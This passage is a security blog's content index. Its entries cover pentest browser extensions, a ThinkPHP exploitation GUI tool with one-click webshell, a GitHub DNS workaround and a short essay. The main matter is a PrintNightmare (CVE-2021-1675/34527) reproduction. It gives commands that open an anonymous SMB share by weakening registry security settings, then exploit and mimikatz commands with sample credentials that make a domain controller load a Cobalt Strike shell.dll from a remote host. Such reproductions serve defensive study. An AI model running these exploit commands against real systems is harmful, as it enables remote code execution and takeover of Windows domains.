SwitchyOmega</h4><p>这个插件可以帮助我们快速管理和切换多个代理设置，支持的代理协议有：HTTP/HTTPS、Socks4/Socks5，这也是一款渗透测试人员（抓包、上 “墙”）必备插件，谷歌上网助手插件也具备这样的代理设置功能。</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif">Proxy SwitchyOmega - Chrome 网上应用店 (google.com)</a></p><h4 id="User-Agent-Switcher"><a href="#User-Agent-Switcher" class="headerlink" title="User-Agent Switcher"></a>User-Agent Switcher</h4><p>这个插件可用来模拟指定 User-Agent 去访问网站，有的开发人员在编写代码过程中会设置仅允许移动端 User-Agent 访问，一些做黑帽 SEO 的也经常使用这种方式来限制 PC 端访问。这款插件在 Chrome 网上应用商店中已经下架了，有需要的可以找我。</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/user-agent-switcher-for-c/djflhoibgkdhkhhcedjiklpkjnoahfmg">User-Agent Switcher for Chrome - Chrome 网上应用店 (google.com)</a></p><h4 id="NoScript"><a href="#NoScript" class="headerlink" title="NoScript"></a>NoScript</h4><p>这个插件可用于禁止浏览器加载和解析 JS 代码，也可以通过以下两种方式禁止执行 JS，常见应用场景有：禁用 JS 后台越权、禁用 JS 白名单上传等。</p><ul><li>  Firefox：about:config-&gt;javascript.enabled    </li><li>  Chorme：chrome://settings/content/javascript</li></ul><p>下载地址:<br><a href="https://chrome.google.com/webstore/detail/noscript/doojmbjmlfjjnbmnoijecmcbfeoakpjm">NoScript - Chrome 网上应用店 (google.com)</a></p><h4 id="JWT-Debugger"><a href="#JWT-Debugger" class="headerlink" title="JWT Debugger"></a>JWT Debugger</h4><p>JWT Debugger 是一款可以编码、验证和生成JWT的开发工具，官方提供了调试工具,我们可以很方便的看到JWT token各个组成部分解码后的信息,以及是否能验证成功。</p><p>下载地址:<br><a href="https://chrome.google.com/webstore/detail/jwt-debugger/ppmmlchacdbknfphdeafcbmklcghghmd">JWT Debugger - Chrome 网上应用店 (google.com)</a></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="Elasticvue"><a href="#Elasticvue" class="headerlink" title="Elasticvue"></a>Elasticvue</h4><p>Elasticsearch 服务未授权访问漏洞进行利用</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/elasticvue/hkedbapjpblbodpgbajblpnlpenaebaa">Elasticvue - Chrome 网上应用店 (google.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具分享 </tag>
            
            <tag> 浏览器插件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PrintNightmare(CVE-2021-1675/CVE-2021-34527)复现</title>
      <link href="posts/29501.html"/>
      <url>posts/29501.html</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><blockquote><p>此漏洞一开始为CVE-2021-1675，随后微软把此漏洞分配给了CVE-2021-34527,并提到了两个漏洞很像，但是攻击向量是不同的。<br>详见: <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">CVE-2021-34527 - 安全更新程序指南 - Microsoft - Windows 打印后台处理程序远程执行代码漏洞</a><br>cve-2021-1675的更新补丁只是修复了本地提权利用，远程代码执行还是可以利用。</p></blockquote><p>Github 公布的地址：<a href="https://github.com/afwu/PrintNightmare">https://github.com/afwu/PrintNightmare</a></p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><ul><li>Windows Server 2012 R2 (Server Core installation)</li><li>Windows Server 2012 R2</li><li>Windows Server 2012 (Server Core installation)</li><li>Windows Server 2012</li><li>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</li><li>Windows Server 2008 R2 for x64-based Systems Service Pack 1</li><li>Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)</li><li>Windows Server 2008 for x64-based Systems Service Pack 2</li><li>Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)</li><li>Windows Server 2008 for 32-bit Systems Service Pack 2</li><li>Windows RT 8.1</li><li>Windows 8.1 for x64-based systems</li><li>Windows 8.1 for 32-bit systems</li><li>Windows 7 for x64-based Systems Service Pack 1</li><li>Windows 7 for 32-bit Systems Service Pack 1</li><li>Windows Server 2016 (Server Core installation)</li><li>Windows Server 2016</li><li>Windows 10 Version 1607 for x64-based Systems</li><li>Windows 10 Version 1607 for 32-bit Systems</li><li>Windows 10 for x64-based Systems</li><li>Windows 10 for 32-bit Systems</li><li>Windows Server, version 20H2 (Server Core Installation)</li><li>Windows 10 Version 20H2 for ARM64-based Systems</li><li>Windows 10 Version 20H2 for 32-bit Systems</li><li>Windows 10 Version 20H2 for x64-based Systems</li><li>Windows Server, version 2004 (Server Core installation)</li><li>Windows 10 Version 2004 for x64-based Systems</li><li>Windows 10 Version 2004 for ARM64-based Systems</li><li>Windows 10 Version 2004 for 32-bit Systems</li><li>Windows 10 Version 21H1 for 32-bit Systems</li><li>Windows 10 Version 21H1 for ARM64-based Systems</li><li>Windows 10 Version 21H1 for x64-based Systems</li><li>Windows 10 Version 1909 for ARM64-based Systems</li><li>Windows 10 Version 1909 for x64-based Systems</li><li>Windows 10 Version 1909 for 32-bit Systems</li><li>Windows Server 2019 (Server Core installation)</li><li>Windows Server 2019</li><li>Windows 10 Version 1809 for ARM64-based Systems</li><li>Windows 10 Version 1809 for x64-based Systems</li><li>Windows 10 Version 1809 for 32-bit Systems</li></ul><h1 id="漏洞准备"><a href="#漏洞准备" class="headerlink" title="漏洞准备"></a>漏洞准备</h1><ul><li>一个普通权限的域账户</li><li>目标开启Spooler服务</li><li>创建的smb服务允许匿名访问，即目标可以直接获取到文件</li></ul><p>首先创建一个可以允许匿名访问的 smb, 在域控上必须能直接获取到文件<br>windows系统创建方法（powershell版本过低的话会报错）：</p><pre class="line-numbers language-none"><code class="language-none">mkdir C:\shareicacls C:\share\ /T /grant Anonymous` logon:ricacls C:\share\ /T /grant Everyone:rNew-SmbShare -Path C:\share -Name share -ReadAccess 'ANONYMOUS LOGON','Everyone'REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f #This will overwrite existing NullSessionPipesREG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionShares /t REG_MULTI_SZ /d share /fREG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /fREG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 0 /f# Reboot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h2><p>python版本的   <a href="https://github.com/cube0x0/CVE-2021-1675">https://github.com/cube0x0/CVE-2021-1675</a><br>C#版：            <a href="https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare">https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare</a><br>C++版本的      <a href="https://github.com/afwu/PrintNightmare">https://github.com/afwu/PrintNightmare</a><br>本地提权版：   <a href="https://github.com/hlldz/CVE-2021-1675-LPE">https://github.com/hlldz/CVE-2021-1675-LPE</a><br>mimikatz:        <a href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20210709">2.2.0 20210709 Printnightmare rewrited</a></p><h2 id="漏洞过程"><a href="#漏洞过程" class="headerlink" title="漏洞过程"></a>漏洞过程</h2><ol><li>首先搭建一个SMB匿名共享，放恶意dll文件。  </li><li>工具运行后会先检测<code>C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_xx </code>文件名，自动替换。</li><li>然后远程拉取我们设置的匿名共享的恶意dll文件执行</li></ol><p>如果报错<code>Error: code: 0x5 - rpc_s_access_denied</code>说明smb还不能匿名访问，<br>如果执行成功，但是只复制了dll并未执行，可能是验证用户不是普通域用户账号。</p><h2 id="python版本"><a href="#python版本" class="headerlink" title="python版本"></a>python版本</h2><p>其中python版本的exp需要按照说明文档安装exp作者的impacket库，其余不需要修改任何东西。</p><pre class="line-numbers language-none"><code class="language-none">pip3 uninstall impacketgit clone https://github.com/cube0x0/impacketcd impacketpython3 ./setup.py install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以使用<code>rpcdump.py</code>来扫描潜在的易受攻击的主机，如果它返回一个值，它可能是易受攻击的<br>协议：[MS-RPRN]：打印系统远程协议  </p><pre class="line-numbers language-none"><code class="language-none">rpcdump.py @192.168.0.1 | grep MS-RPRN<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后进行利用，这里使用 dll 是 cs 生成的 dll</p><pre class="line-numbers language-none"><code class="language-none">python3 CVE-2021-1675.py djhons.com/test:Admin@123@192.168.0.1 '\\192.168.0.2\smb\shell.dll'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h2><pre class="line-numbers language-none"><code class="language-none">mimikatz.exemisc::printnightmare /server:192.168.0.1 /authuser:localuser /authpassword:pass /library:\\192.168.0.2\smb\shell.dll /nodynamic<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="c-版本"><a href="#c-版本" class="headerlink" title="c++版本"></a>c++版本</h2><p>没测试，需要改源码，参考一下。</p><p>推荐使用其他工具，可以自动枚举路径。</p><pre class="line-numbers language-none"><code class="language-none">//info.pDriverPath = (LPWSTR)L"C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_[受害机特有的]\\Amd64\\UNIDRV.DLL";info.pDriverPath = (LPWSTR)L"C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL";剩下是将含有old的路径改为 C:\\Windows\\System32\\spool\\drivers\\x64\\%s。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.cnblogs.com/Mikasa-Ackerman/p/CVE20211675lou-dong-fu-xian.html">https://www.cnblogs.com/Mikasa-Ackerman/p/CVE20211675lou-dong-fu-xian.html</a><br><a href="https://mp.weixin.qq.com/s/Vceup70C9USoM4JwK-6Z9w">https://mp.weixin.qq.com/s/Vceup70C9USoM4JwK-6Z9w</a><br><a href="https://mp.weixin.qq.com/s/iNOb6cBAfMwCm2AjqbdEvQ">https://mp.weixin.qq.com/s/iNOb6cBAfMwCm2AjqbdEvQ</a><br><a href="https://mp.weixin.qq.com/s/tMTIsijirsPc46CZVtcWQg">CVE-2021-1675 打印机漏洞沦陷域控的补充 07/02/21</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> PrintNightmare </tag>
            
            <tag> CVE-2021-1675 </tag>
            
            <tag> CVE-2021-34527 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP图形化综合利用工具</title>
      <link href="posts/54917.html"/>
      <url>posts/54917.html</url>
      
        <content type="html"><![CDATA[<p>下载地址：<br><a href="https://github.com/bewhale/thinkphp_gui_tools/releases/download/V2.0/ThinkPHP.V2.0.by.jar">ThinkPHP 综合利用工具 V2.0 by 蓝鲸.jar</a></p><p>本项目是采用 JDK8 + javafx 开发的 ThinkPHP 图形化综合利用工具， 参考了其他大佬项目的部分代码。</p><p>JDK8可以直接运行，JDK11 因为去除了javafx这个依赖，需要自己再加上参数加入模块</p><p><code>java -Dfile.encoding="UTF-8" --module-path "C:\Program Files\Java\javafx-sdk-11.0.2\lib" --add-modules "javafx.controls,javafx.fxml,javafx.web" -jar "xxx.jar" </code></p><ul><li>支持大部分ThinkPHP漏洞检测,整合20多个payload</li><li>支持部分漏洞执行命令</li><li>支持单一漏洞批量检测</li><li>支持TP3和TP5自定义路径日志遍历</li><li>支持部分漏洞一键GetShell</li><li>支持设置代理和UA</li></ul><p><img src="https://raw.githubusercontents.com/bewhale/thinkphp_gui_tools/main/img.png"></p><p><img src="https://raw.githubusercontents.com/bewhale/thinkphp_gui_tools/main/img1.png"></p><p><img src="https://raw.githubusercontents.com/bewhale/thinkphp_gui_tools/main/img2.png"></p><h1 id="参考项目"><a href="#参考项目" class="headerlink" title="参考项目"></a>参考项目</h1><p><a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection">https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection</a><br><a href="https://github.com/Lucifer1993/TPscan">https://github.com/Lucifer1993/TPscan</a><br><a href="https://github.com/fupinglee/JavaTools">https://github.com/fupinglee/JavaTools</a><br><a href="https://github.com/xinyu2428/TDOA_RCE">https://github.com/xinyu2428/TDOA_RCE</a>  </p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinkphp </tag>
            
            <tag> 图形化 </tag>
            
            <tag> 命令执行 </tag>
            
            <tag> getshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github部分网站无法访问解决办法</title>
      <link href="posts/7204.html"/>
      <url>posts/7204.html</url>
      
        <content type="html"><![CDATA[<p>国内大部分地方无法访问以下域名</p><ul><li>*.github.io </li><li>raw.githubusercontent.com</li></ul><p>原因大都是是国内运营商DNS污染, ping一些域名可以发现,<br>域名往往被指向了  127.0.0.1, 或者直接提示找不到主机</p><p>修改本地hosts文件的话，遇到一个新的域名，又要添加一条新纪录，稍显麻烦，</p><p>所有我们直接修改本机的DNS地址，一劳永逸。</p><p>修改完DNS地址后，点击高级查看是否还有其他的DNS地址，删除掉。</p><p>然后打开cmd， 执行 <code>ipconfig /flushdns</code> 清除缓存</p><p>如下图：</p><p><img src="https://raw.githubusercontents.com/bewhale/img/master/img20210707080127.png"></p><p>一些常用的DNS地址：</p><pre class="line-numbers language-none"><code class="language-none">114DNS首选：114.114.114.114备选：114.114.114.115Google DNS8.8.8.88.8.4.4阿里 AliDNS首选：233.5.5.5备选：223.6.6.6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者使用图形化工具来一键测试，修改，不要忘记在高级里面把多余的DNS地址删除掉。</p><p> <a href="https://www.sordum.org/7952/dns-jumper-v2-2/">dns-jumper-v2-2/</a></p>]]></content>
      
      
      <categories>
          
          <category> 经验之谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GitHub </tag>
            
            <tag> DNS污染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>essay-life</title>
      <link href="posts/986.html"/>
      <url>posts/986.html</url>
      
        <content type="html"><![CDATA[<div class="ipage">    <div class="ititle">节选自《你若安好便是晴天》- 前言</div>    <div class="izhengwen">        <p>生活，有时感觉莫名的心烦。心烦的时候，最好的是沉默。</p>        <p>不必喝酒，出去走走，那小路和树林，那天空和海滩，那山风和淡云，就在身旁；</p>        <p>不必多怨，言多不逊，执一本书，在阳光下，微笑着面对一切，聆听一切；</p>        <p>不必伤怀，曲折有度，也许过了就算了，算了就消失了。</p>        <p>心烦，其实只是人的一种心情，看淡了，就习惯了。</p>        <p>生活，有时真的让人无语，令人心碎。</p>        <p>只是，既是自己选择的路，跪着也要走下去。</p>        <p>自己扛下的事，留着泪也要做好。</p>        <p>而有些情，舍不得也得放下，哪怕心再痛再苦。</p>        <p>其实，缘来缘去的个中滋味，只有岁月懂得，也只有自己深深懂得!</p>        <p>生活，有时候其实很简单。</p>        <p>生活，不过是一份发自内心的微笑；</p>        <p>是一种清淡如水的心态，对苦难，对幸福，对整个人生；</p>        <p>更是一本永远也读不完的书，有故事，有梦想，有难以言说的情怀。</p>        <p>倘若有天，在一个阳光温热的午后，树荫下，你会发现：净是如此美丽 !</p>        <p>亲爱的，很多时候不是生活抛弃了你，而是你抛弃了生活本身。</p>    </div></div>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
            <tag> 请相信生活 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
